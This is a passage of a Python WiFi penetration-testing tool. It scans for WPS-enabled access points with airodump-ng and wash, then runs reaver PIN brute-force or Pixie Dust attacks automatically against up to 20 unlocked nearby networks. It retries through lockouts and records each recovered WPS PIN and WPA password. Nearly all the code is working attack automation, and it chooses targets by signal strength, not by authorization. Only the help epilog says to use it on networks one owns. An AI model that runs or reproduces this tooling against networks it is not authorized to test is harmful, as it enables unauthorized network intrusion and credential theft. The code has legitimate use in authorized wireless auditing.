                      log_file=None, pixie_dust: bool = False,
                      timeout: int = 10, delay: int = 3, lock_delay: int = 60,
                      recurring_delay: str = None, win7: bool = False,
                      dh_small: bool = False, start_pin: str = None,
                      no_nacks: bool = False, eap_terminate: bool = False,
                      max_target_time: int = 1800) -> AttackResult:
    """
    Run reaver against a single target with lock detection/retry logic.
    Updates result_obj in real-time for live progress display.

    Args:
        pixie_dust: If True, use Pixie Dust attack (-K 1) for faster offline cracking
        timeout: Receive timeout in seconds (default: 10)
        delay: Delay between PIN attempts in seconds (default: 3)
        lock_delay: Time to wait if AP locks WPS (default: 60)
        recurring_delay: Sleep pattern as "N:SEC" (e.g., "3:60")
        win7: Mimic Windows 7 registrar behavior
        dh_small: Use small Diffie-Hellman keys (faster)
        start_pin: Start with specific PIN (for resuming)
        no_nacks: Don't send NACK messages
        eap_terminate: Terminate sessions with EAP FAIL
        max_target_time: Maximum time for this target in seconds (0 = unlimited)
    """
    start_time = time.time()
    retry_count = 0
    use_no_association = True

    attack_mode = "Pixie Dust" if pixie_dust else "standard"
    tui_print(f"[+] Starting {attack_mode} attack on {target.essid} ({target.bssid})", tui)

    # Write target header to log file
    if log_file:
        log_file.write(f"\n{'='*80}\n")
        log_file.write(f"TARGET: {target.essid} ({target.bssid}) - Channel {target.channel}\n")
        log_file.write(f"Attack Mode: {attack_mode}\n")
        log_file.write(f"Started: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n")
        log_file.write(f"{'='*80}\n\n")
        log_file.flush()

    while retry_count <= max_retries:
        # Check max target time limit
        if max_target_time > 0 and (time.time() - start_time) >= max_target_time:
            tui_print(f"[!] Max target time ({max_target_time}s) reached, moving to next target", tui)
            elapsed = time.time() - start_time
            result_obj.status = "TIMEOUT"
            result_obj.wps_pin = "-"
            result_obj.password = "-"
            result_obj.time_spent = elapsed
            result_obj.retries = retry_count
            update_targets_table(all_results, stats, tui)

            if log_file:
                log_file.write(f"\n--- RESULT: TIMEOUT ---\n")
                log_file.write(f"Max target time ({max_target_time}s) exceeded\n")
                log_file.write(f"Time: {int(elapsed)}s | Retries: {retry_count}\n")
                log_file.write(f"Ended: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n\n")
                log_file.flush()

            return result_obj

        # Build reaver command with all options
        cmd = [
            "reaver",
            "-i", interface,
            "-b", target.bssid,
            "-c", target.channel,
            "-d", str(delay),
            "-T", str(timeout),
            "-l", str(lock_delay),
            "-vv"
        ]

        # Add Pixie Dust flag if enabled
        if pixie_dust:
            cmd.extend(["-K", "1"])

        # Add recurring delay if specified (format: "N:SEC")
        if recurring_delay:
            cmd.extend(["-r", recurring_delay])

        # Add Windows 7 compatibility mode
        if win7:
            cmd.append("-W")

        # Add small DH keys for faster crypto
        if dh_small:
            cmd.append("-S")

        # Add start PIN for resuming
        if start_pin:
            cmd.extend(["-p", start_pin])

        # Add no-nacks option
        if no_nacks:
            cmd.append("-n")

        # Add EAP terminate option
        if eap_terminate:
            cmd.append("-E")

        if use_no_association:
            cmd.append("-N")
            mode_str = "Pixie Dust, no-association" if pixie_dust else "no-association"
            tui_print(f"[*] Attempt {retry_count + 1}/{max_retries + 1} ({mode_str} mode)", tui)
        else:
            mode_str = "Pixie Dust, direct association" if pixie_dust else "direct association"
            tui_print(f"[*] Attempt {retry_count + 1}/{max_retries + 1} ({mode_str} mode)", tui)

        try:
            proc = subprocess.Popen(
                cmd,
                stdout=subprocess.PIPE,
                stderr=subprocess.STDOUT,
                universal_newlines=True
            )

            last_progress_time = time.time()
            wps_pin = None
            password = None
            locked = False
            association_failed = False
            pins_tried = 0
            total_pins = 11000  # Approximate total WPS PINs to try

            # Monitor output
            last_refresh = time.time()
            while True:
                # Use select with timeout to allow keyboard input checking
                ready, _, _ = select.select([proc.stdout], [], [], 0.1)

                if ready:
                    line = proc.stdout.readline()
                    if not line and proc.poll() is not None:
                        break
                else:
                    line = ""
                    # Check if process ended
                    if proc.poll() is not None:
                        break

                if line:
                    # Write ALL output to log file (complete reaver output)
                    if log_file:
                        log_file.write(line)
                        log_file.flush()

                    # Determine if we should print this line based on verbose mode
                    should_print = verbose

                    # Always print important lines regardless of verbose mode
                    if any(keyword in line for keyword in _IMPORTANT_KEYWORDS):
                        should_print = True

                    if should_print:
                        tui_print(line.rstrip(), tui)

                    # Extract current PIN being tested
                    pin_match = re.search(r"Trying pin[:\s]+['\"]?(\d{8})['\"]?", line, re.IGNORECASE)
                    if pin_match:
                        current_pin = pin_match.group(1)
                        result_obj.current_pin = current_pin
                        pins_tried += 1
                        result_obj.pins_tried = pins_tried
                        result_obj.pin_progress = min(int((pins_tried / total_pins) * 100), 99)

                        # Update table every 10 PINs to avoid excessive redraws
                        if pins_tried % 10 == 0:
                            update_targets_table(all_results, stats, tui)
                            last_refresh = time.time()

                # Refresh display periodically even without new output (for TUI mode)
                if tui and tui.enabled and (time.time() - last_refresh) > 2:
                    update_targets_table(all_results, stats, tui)
                    last_refresh = time.time()

                # Check for skip/cancel request from user
                if tui and tui.enabled and tui.skip_current_target:
                    tui.skip_current_target = False  # Reset flag
                    tui_print("[!] User cancelled - skipping to next target", tui)
                    proc.kill()
                    proc.wait()

                    elapsed = time.time() - start_time
                    result_obj.status = "CANCELLED"
                    result_obj.wps_pin = "-"
                    result_obj.password = "-"
                    result_obj.time_spent = elapsed
                    result_obj.retries = retry_count
                    update_targets_table(all_results, stats, tui)

                    # Log cancelled summary
                    if log_file:
                        log_file.write(f"\n--- RESULT: CANCELLED ---\n")
                        log_file.write(f"Skipped by user\n")
                        log_file.write(f"Time: {int(elapsed)}s | Retries: {retry_count}\n")
                        log_file.write(f"Ended: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n\n")
                        log_file.flush()

                    return result_obj

                if line:
                    # Check for success
                    if "[+] WPS PIN:" in line:
                        match = re.search(r"WPS PIN: '(\d+)'", line)
                        if match:
                            wps_pin = match.group(1)
                            result_obj.wps_pin = wps_pin
                            result_obj.pin_progress = 100
                            last_progress_time = time.time()
                            update_targets_table(all_results, stats, tui)

                    if "[+] WPA PSK:" in line:
                        match = re.search(r"WPA PSK: '(.+)'", line)
                        if match:
                            password = match.group(1)
                            result_obj.password = password
                            last_progress_time = time.time()
                            update_targets_table(all_results, stats, tui)

                    # Check for lock
                    if detect_wps_lock(line):
                        locked = True

                    # Check for association failure
                    if "Failed to associate" in line or "WARNING: Failed to associate" in line:
                        association_failed = True

                    # Any progress resets timer
                    if any(indicator in line for indicator in ["Trying pin", "Sending", "Received"]):
                        last_progress_time = time.time()

                # Check if stuck (no progress for 60 seconds)
                if time.time() - last_progress_time > 60:
                    tui_print("[!] No progress for 60 seconds, assuming locked", tui)
                    locked = True
                    proc.kill()
                    break

                # Check max target time limit inside the loop for faster response
                if max_target_time > 0 and (time.time() - start_time) >= max_target_time:
                    tui_print(f"[!] Max target time ({max_target_time}s) reached", tui)
                    proc.kill()
                    proc.wait()

                    elapsed = time.time() - start_time
                    result_obj.status = "TIMEOUT"
                    result_obj.wps_pin = "-"
                    result_obj.password = "-"
                    result_obj.time_spent = elapsed
                    result_obj.retries = retry_count
                    update_targets_table(all_results, stats, tui)

                    if log_file:
                        log_file.write(f"\n--- RESULT: TIMEOUT ---\n")
                        log_file.write(f"Max target time ({max_target_time}s) exceeded\n")
                        log_file.write(f"Time: {int(elapsed)}s | Retries: {retry_count}\n")
                        log_file.write(f"Ended: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n\n")
                        log_file.flush()

                    return result_obj

            proc.wait()

            # Log if reaver exited with error
            if proc.returncode and proc.returncode not in (0, -9, -15):  # -9=SIGKILL, -15=SIGTERM
                tui_print(f"[!] reaver exited with code {proc.returncode}", tui)

            # Check if we succeeded
            if wps_pin:
                elapsed = time.time() - start_time
                tui_print(f"[+] SUCCESS! WPS PIN: {wps_pin}", tui)
                if password:
                    tui_print(f"[+] Password: {password}", tui)

                result_obj.status = "SUCCESS"
                result_obj.wps_pin = wps_pin
                result_obj.password = password or "-"
                result_obj.time_spent = elapsed
                result_obj.retries = retry_count
                result_obj.pin_progress = 100
                update_targets_table(all_results, stats, tui)

                # Log success summary
                if log_file:
                    log_file.write(f"\n--- RESULT: SUCCESS ---\n")
                    log_file.write(f"WPS PIN: {wps_pin}\n")
                    log_file.write(f"Password: {password or '-'}\n")
                    log_file.write(f"Time: {int(elapsed)}s | Retries: {retry_count}\n")
                    log_file.write(f"Ended: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n\n")
                    log_file.flush()

                return result_obj

            # Handle association failure - switch modes
            if association_failed and use_no_association:
                tui_print("[!] No-association mode failed, switching to direct association", tui)
                use_no_association = False
                continue

            # Handle WPS lock
            if locked:
                retry_count += 1
                if retry_count <= max_retries:
                    wait_with_countdown(300, "WPS lock detected", tui, all_results, stats)  # 5 minutes
                    use_no_association = True  # Reset to no-association for retry
                else:
                    tui_print(f"[!] Max retries ({max_retries}) reached, target locked", tui)
                    elapsed = time.time() - start_time
                    result_obj.status = "LOCKED"
                    result_obj.wps_pin = "-"
                    result_obj.password = "-"
                    result_obj.time_spent = elapsed
                    result_obj.retries = retry_count
                    update_targets_table(all_results, stats, tui)

                    # Log locked summary
                    if log_file:
                        log_file.write(f"\n--- RESULT: LOCKED ---\n")
                        log_file.write(f"Max retries ({max_retries}) reached\n")
                        log_file.write(f"Time: {int(elapsed)}s | Retries: {retry_count}\n")
                        log_file.write(f"Ended: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n\n")
                        log_file.flush()

                    return result_obj
            else:
                # Failed for other reasons
                retry_count += 1
                if retry_count <= max_retries:
                    tui_print(f"[!] Attack failed, retrying ({retry_count}/{max_retries})...", tui)
                    time.sleep(5)

        except Exception as e:
            tui_print(f"[!] Error during attack: {e}", tui)
            retry_count += 1
            if retry_count <= max_retries:
                time.sleep(5)

    # Failed after all retries
    elapsed = time.time() - start_time
    result_obj.status = "FAILED"
    result_obj.wps_pin = "-"
    result_obj.password = "-"
    result_obj.time_spent = elapsed
    result_obj.retries = retry_count
    update_targets_table(all_results, stats, tui)

    # Log failed summary
    if log_file:
        log_file.write(f"\n--- RESULT: FAILED ---\n")
        log_file.write(f"Time: {int(elapsed)}s | Retries: {retry_count}\n")
        log_file.write(f"Ended: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n\n")
        log_file.flush()

    return result_obj


def print_table(aps: List[AccessPoint]):
    """Pretty table."""
    headers = [
        ("#", 3), ("PWR", 4), ("CH", 3),
        ("BSSID", 17), ("ESSID", 20),
        ("ENC", 7), ("CIPH", 6), ("AUTH", 6),
        ("WPS", 5), ("LOCK", 5), ("STATUS", 10),
    ]

    print("\n=== WiFi Passive Audit Table ===")
    print("(sorted by strongest signal)\n")

    # header
    line = "  " + "  ".join(h[0].ljust(h[1]) for h in headers)
    print(line)
    print("  " + "  ".join("-" * h[1] for h in headers))

    for i, ap in enumerate(aps, 1):
        row = [
            str(i).ljust(3),
            str(ap.pwr).ljust(4),
            ap.channel.ljust(3),
            ap.bssid.ljust(17),
            ap.essid[:20].ljust(20),
            ap.privacy.ljust(7),
            ap.cipher.ljust(6),
            ap.auth.ljust(6),
            ap.wps.ljust(5),
            ap.locked.ljust(5),
            ap.status.ljust(10),
        ]
        print("  " + "  ".join(row))


def wps_to_access_point(wps_ap: WPSAccessPoint) -> AccessPoint:
    """Convert WPSAccessPoint to AccessPoint for attack phase."""
    return AccessPoint(
        bssid=wps_ap.bssid,
        pwr=wps_ap.pwr,
        channel=wps_ap.channel,
        essid=wps_ap.essid,
        privacy=wps_ap.privacy,
        cipher="",
        auth="",
        wps="Yes",
        locked="Yes" if wps_ap.wps_locked else "No",
        status="PENDING"
    )


def write_wps_results_csv(results: List[WPSAccessPoint], filename: str) -> str:
    """Write WPS scan results to CSV file.

    Args:
        results: List of WPSAccessPoint objects
        filename: Base filename (without extension)

    Returns:
        Full path to created CSV file
    """
    import csv
    csv_filename = f"{filename}.csv"

    with open(csv_filename, 'w', newline='') as f:
        writer = csv.writer(f)
        writer.writerow(['BSSID', 'Channel', 'PWR', 'ESSID', 'Privacy',
                        'WPS Version', 'WPS Locked', 'Source'])
        for ap in results:
            writer.writerow([
                ap.bssid,
                ap.channel,
                ap.pwr,
                ap.essid,
                ap.privacy,
                ap.wps_version,
                'Yes' if ap.wps_locked else 'No',
                ap.source
            ])

    return csv_filename


def write_wps_results_table(results: List[WPSAccessPoint], filename: str) -> str:
    """Write WPS scan results as formatted table to file.

    Args:
        results: List of WPSAccessPoint objects
        filename: Base filename (without extension)

    Returns:
        Full path to created table file
    """
    table_filename = f"{filename}.txt"

    with open(table_filename, 'w') as f:
        # Header
        f.write(f"WiFi WPS Scan Results - {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n")
        f.write(f"Total WPS 1.0/2.0/Locked targets: {len(results)}\n")
        f.write("=" * 110 + "\n\n")

        # Table header
        header = f"{'#':<3} | {'BSSID':<17} | {'CH':<3} | {'PWR':<4} | {'ESSID':<25} | {'WPS':<6} | {'Locked':<6} | {'Source':<10}"
        f.write(header + "\n")
        f.write("-" * 110 + "\n")

        # Rows
        for i, ap in enumerate(results, 1):
            essid_display = ap.essid[:25] if ap.essid else '<Hidden>'
            row = f"{i:<3} | {ap.bssid:<17} | {ap.channel:<3} | {ap.pwr:<4} | {essid_display:<25} | {ap.wps_version:<6} | {'Yes' if ap.wps_locked else 'No':<6} | {ap.source:<10}"
            f.write(row + "\n")

        f.write("-" * 110 + "\n")

    return table_filename


def save_results_to_file(results: List[AttackResult], interface: str, filename: str):
    """Save attack results to log file."""
    with open(filename, 'w') as f:
        f.write(f"WiFi Audit Results - {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n")
        f.write(f"Interface: {interface}\n")
        f.write(f"Targets Scanned: {len(results)}\n")
        f.write("\n")

        for result in results:
            f.write(f"[{result.target_num}/{len(results)}] BSSID: {result.bssid} | ESSID: {result.essid} | Channel: {result.channel}\n")
            f.write(f"Status: {result.status}\n")

            if result.status == "SUCCESS":
                f.write(f"WPS PIN: {result.wps_pin}\n")
                f.write(f"Password: {result.password}\n")

            mins, secs = divmod(int(result.time_spent), 60)
            f.write(f"Time: {mins}m {secs}s\n")
            f.write(f"Retries: {result.retries}\n")
            f.write("\n")

    print(f"[+] Results saved to {filename}")


def print_results_table(results: List[AttackResult]):
    """Format and display final results table to console."""
    success_count = sum(1 for r in results if r.status == "SUCCESS")
    failed_count = sum(1 for r in results if r.status == "FAILED")
    locked_count = sum(1 for r in results if r.status == "LOCKED")

    print("\n" + "=" * 80)
    print("=== Final Attack Results ===")
    print("=" * 80)
    print(f"Total Targets: {len(results)}")
    print(f"Successful: {success_count}")
    print(f"Failed: {failed_count}")
    print(f"Locked: {locked_count}")
    print()

    print("Detailed Results:")
    print("+" + "-" * 4 + "+" + "-" * 19 + "+" + "-" * 22 + "+" + "-" * 10 + "+" + "-" * 11 + "+" + "-" * 14 + "+" + "-" * 10 + "+")
    print("| #  | BSSID             | ESSID                | Status   | WPS PIN   | Password     | Time     |")
    print("+" + "-" * 4 + "+" + "-" * 19 + "+" + "-" * 22 + "+" + "-" * 10 + "+" + "-" * 11 + "+" + "-" * 14 + "+" + "-" * 10 + "+")

    for result in results:
        mins, secs = divmod(int(result.time_spent), 60)
        time_str = f"{mins}m {secs}s"

        print(f"| {result.target_num:<2} | {result.bssid:<17} | {result.essid[:20]:<20} | {result.status:<8} | {result.wps_pin:<9} | {result.password[:12]:<12} | {time_str:<8} |")

    print("+" + "-" * 4 + "+" + "-" * 19 + "+" + "-" * 22 + "+" + "-" * 10 + "+" + "-" * 11 + "+" + "-" * 14 + "+" + "-" * 10 + "+")


# ---------------------------------------------------------
# Main
# ---------------------------------------------------------

def run_main_logic(args, tui=None):
    """Main logic that can run with or without TUI."""
    # Check if interface is in monitor mode
    tui_print("[*] Checking interface mode...", tui)
    if not check_monitor_mode(args.interface):
        tui_print(f"[!] Error: Interface {args.interface} is not in monitor mode", tui)
        tui_print("[!] Please enable monitor mode first (e.g., 'sudo airmon-ng start wlan0')", tui)
        sys.exit(1)
    tui_print(f"[+] Interface {args.interface} is in monitor mode", tui)

    # Initialize unified results manager for WPS 1.0/2.0/Locked networks
    results_manager = WPSResultsManager()

    # Run scans based on CLI flags (default: run both)
    if not args.only_wash:
        # Run airodump-ng scan (parses live output)
        run_airodump_live(args.interface, args.airodump_duration, results_manager, tui)

    if not args.only_airodump:
        # Run wash scan
        wash_duration = args.wash_duration if args.wash_duration is not None else args.airodump_duration
        run_wash(args.interface, wash_duration, results_manager, tui)

    # Get union of all WPS results (sorted by signal strength)
    wps_results = results_manager.get_all_results()

    # Write scan results to files (CSV and table format)
    timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
    scan_filename = f"wps_scan_{timestamp}"
    csv_file = write_wps_results_csv(wps_results, scan_filename)
    table_file = write_wps_results_table(wps_results, scan_filename)
    tui_print(f"[+] WPS scan results saved to: {csv_file} and {table_file}", tui)

    # Switch from scan phase to attack phase (changes table display)
    if tui and tui.enabled:
        tui.scan_phase = False

    # Convert WPSAccessPoint to AccessPoint for attack phase and display
    sorted_aps = [wps_to_access_point(wps_ap) for wps_ap in wps_results]

    # Display passive scan results (only in non-TUI mode or before TUI starts)
    if not tui or not tui.enabled:
        print_table(sorted_aps)

    # If passive mode, stop here
    if args.passive:
        tui_print("[*] Passive mode - no attacks will be performed", tui)
        return

    # Filter for WPS-enabled targets that are not locked
    wps_targets = [
        ap for ap in sorted_aps
        if ap.locked != "Yes"
    ]

    if not wps_targets:
        tui_print("[!] No unlocked WPS targets found", tui)
        return

    # Take top 20
    targets = wps_targets[:20]
    tui_print(f"\n[+] Found {len(wps_targets)} unlocked WPS targets", tui)
    tui_print(f"[+] Attacking top {len(targets)} targets\n", tui)

    # Initialize progress stats
    stats = {
        'total': len(targets),
        'completed': 0,
        'success': 0,
        'failed': 0,
        'locked': 0,
        'cancelled': 0,
        'timeout': 0,
        'current_target': None,
        'current_index': 0
    }

    # Initialize all results as PENDING
    results = []
    for idx, target in enumerate(targets, 1):
        results.append(AttackResult(
            target_num=idx,
            bssid=target.bssid,
            essid=target.essid,
            channel=target.channel,
            status="PENDING",
            wps_pin="-",
            password="-",
            time_spent=0.0,
            retries=0
        ))

    # Display initial table
    update_targets_table(results, stats, tui)
    time.sleep(2)  # Give user time to see the initial state

    # Create reaver output log file
    reaver_log_filename = f"reaver_output_{timestamp}.log"
    reaver_log = open(reaver_log_filename, 'w')
    reaver_log.write(f"Reaver Complete Output Log\n")
    reaver_log.write(f"Started: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n")
    reaver_log.write(f"Interface: {args.interface}\n")
    reaver_log.write(f"Total Targets: {len(targets)}\n")
    reaver_log.write(f"{'='*80}\n\n")
    reaver_log.flush()
    tui_print(f"[+] Reaver output logging to: {reaver_log_filename}", tui)

    # Track session start time for max_session_time
    session_start_time = time.time()

    # Attack each target
    for idx, target in enumerate(targets, 1):
        # Check session timeout before starting next target
        if args.max_session_time > 0:
            session_elapsed = time.time() - session_start_time
            if session_elapsed >= args.max_session_time:
                tui_print(f"[!] Max session time ({args.max_session_time}s) reached, stopping all attacks", tui)
                # Mark remaining targets as not attempted
                for remaining_idx in range(idx - 1, len(results)):
                    if results[remaining_idx].status == "PENDING":
                        results[remaining_idx].status = "SKIPPED"
                break

        stats['current_target'] = target
        stats['current_index'] = idx

        # Mark current target as IN_PROGRESS
        results[idx - 1].status = "IN_PROGRESS"
        update_targets_table(results, stats, tui)

        # Run attack (pass the result object for live updates)
        result = run_reaver_attack(
            target,
            args.interface,
            results[idx - 1],
            stats,
            results,
            max_retries=10,
            verbose=args.verbose,
            tui=tui,
            log_file=reaver_log,
            pixie_dust=args.pixie_dust,
            timeout=args.timeout,
            delay=args.delay,
            lock_delay=args.lock_delay,
            recurring_delay=args.recurring_delay,
            win7=args.win7,
            dh_small=args.dh_small,
            start_pin=args.start_pin,
            no_nacks=args.no_nacks,
            eap_terminate=args.eap_terminate,
            max_target_time=args.max_target_time
        )

        # Update stats
        stats['completed'] += 1
        if result.status == "SUCCESS":
            stats['success'] += 1
        elif result.status == "LOCKED":
            stats['locked'] += 1
        elif result.status == "CANCELLED":
            stats['cancelled'] += 1
        elif result.status == "TIMEOUT":
            stats['timeout'] += 1
        else:
            stats['failed'] += 1

        # Final table update for this target
        update_targets_table(results, stats, tui)

    # Close reaver log file
    reaver_log.write(f"\n{'='*80}\n")
    reaver_log.write(f"All attacks completed: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n")
    reaver_log.write(f"Success: {stats['success']} | Failed: {stats['failed']} | Locked: {stats['locked']} | Cancelled: {stats['cancelled']} | Timeout: {stats['timeout']}\n")
    reaver_log.close()
    print(f"[+] Complete reaver output saved to: {reaver_log_filename}")

    # Exit curses mode before showing final results
    if tui and tui.enabled:
        # Disable TUI to allow normal printing
        tui.enabled = False

    # Display final results
    print_results_table(results)

    # Save attack results to file
    log_filename = f"wifi_audit_results_{timestamp}.txt"
    save_results_to_file(results, args.interface, log_filename)


def main():
    """Main entry point with argument parsing."""
    parser = argparse.ArgumentParser(
        description='WiFi WPS penetration testing tool - Scans and attacks WPS-enabled networks',
        epilog='WARNING: Only use on networks you own or have authorization to test.',
        formatter_class=argparse.RawDescriptionHelpFormatter
    )
    parser.add_argument(
        "-i", "--interface",
        required=True,
        metavar="IFACE",
        help="wireless interface in monitor mode (required)"
    )
    parser.add_argument(
        "-a", "--airodump-duration",
        type=int,
        default=480,
        metavar="SEC",
        help="airodump-ng scan duration in seconds (default: 480)"
    )
    parser.add_argument(
        "-w", "--wash-duration",
        type=int,
        default=None,
        metavar="SEC",
        help="wash scan duration in seconds (default: same as airodump duration)"
    )
    parser.add_argument(
        "-o", "--output-prefix",
        default="scan",
        metavar="PREFIX",
        help="output file prefix for scan results (default: scan)"
    )
    parser.add_argument(
        "--passive",
        action="store_true",
        help="passive scan only, no WPS attacks (default: active mode)"
    )
    parser.add_argument(
        "--verbose",
        action="store_true",
        help="show all reaver output lines (default: important lines only)"
    )
    parser.add_argument(
        "--no-curses",
        action="store_true",
        help="disable curses TUI, use legacy scrolling output (for debugging or compatibility)"
    )
    parser.add_argument(
        "--only-airodump",
        action="store_true",
        help="use only airodump-ng scan, skip wash"
    )
    parser.add_argument(
        "--only-wash",
        action="store_true",
        help="use only wash scan, skip airodump-ng"
    )
    parser.add_argument(
        "--pixie-dust", "-K",
        action="store_true",
        help="use Pixie Dust attack (reaver -K 1) - faster offline attack exploiting weak RNG"
    )

    # Advanced reaver options
    parser.add_argument(
        "--timeout", "-T",
        type=int,
        default=10,
        metavar="SEC",
        help="reaver receive timeout in seconds (default: 10, increase for weak signals)"
    )
    parser.add_argument(
        "--delay", "-d",
        type=int,
        default=3,
        metavar="SEC",
        help="delay between PIN attempts in seconds (default: 3)"
    )
    parser.add_argument(
        "--lock-delay", "-l",
        type=int,
        default=60,
        metavar="SEC",
        help="time to wait if AP locks WPS in seconds (default: 60)"
    )
    parser.add_argument(
        "--recurring-delay", "-r",
        type=str,
        default=None,
        metavar="N:SEC",
        help="sleep SEC seconds every N PIN attempts (e.g., '3:60' = sleep 60s every 3 attempts)"
    )
    parser.add_argument(
        "--win7", "-W",
        action="store_true",
        help="mimic Windows 7 registrar behavior (better compatibility with some APs)"
    )
    parser.add_argument(
        "--dh-small", "-S",
        action="store_true",
        help="use small Diffie-Hellman keys (speeds up crypto operations)"
    )
    parser.add_argument(
        "--start-pin", "-p",
        type=str,
        default=None,
        metavar="PIN",
        help="start with a specific PIN (8 digits, for resuming attacks)"
    )
    parser.add_argument(
        "--no-nacks",
        action="store_true",
        help="do not send NACK messages when out of order packets received"
    )
    parser.add_argument(
        "--eap-terminate", "-E",
        action="store_true",
        help="terminate each WPS session with EAP FAIL packet"
    )
    parser.add_argument(
        "--max-target-time",
        type=int,
        default=1800,
        metavar="SEC",
        help="maximum time per target in seconds (default: 1800 = 30 minutes, 0 = unlimited)"
    )
    parser.add_argument(
        "--max-session-time",
        type=int,
        default=0,
        metavar="SEC",
        help="maximum total session time in seconds (default: 0 = unlimited)"
    )
    args = parser.parse_args()

    # Validate mutually exclusive options
    if args.only_airodump and args.only_wash:
        parser.error("--only-airodump and --only-wash are mutually exclusive")

    # Decide whether to use curses or not
    use_curses = not args.no_curses and not args.passive

    if use_curses:
        # Run with curses TUI
        def curses_main(stdscr):
            tui = WifiAuditTUI(stdscr)
            try:
                run_main_logic(args, tui)
            except KeyboardInterrupt:
                tui.enabled = False
                print("\n[!] Interrupted by user")
            except Exception as e:
                tui.enabled = False
                print(f"\n[!] Error: {e}")
                raise

        try:
            curses.wrapper(curses_main)
        except Exception as e:
            print(f"[!] Curses initialization failed: {e}")
            print("[!] Falling back to legacy mode...")
            run_main_logic(args, None)
    else:
        # Run without curses (legacy mode or passive mode)
        try:
            run_main_logic(args, None)
        except KeyboardInterrupt:
            print("\n[!] Interrupted by user")


if __name__ == "__main__":
    main()
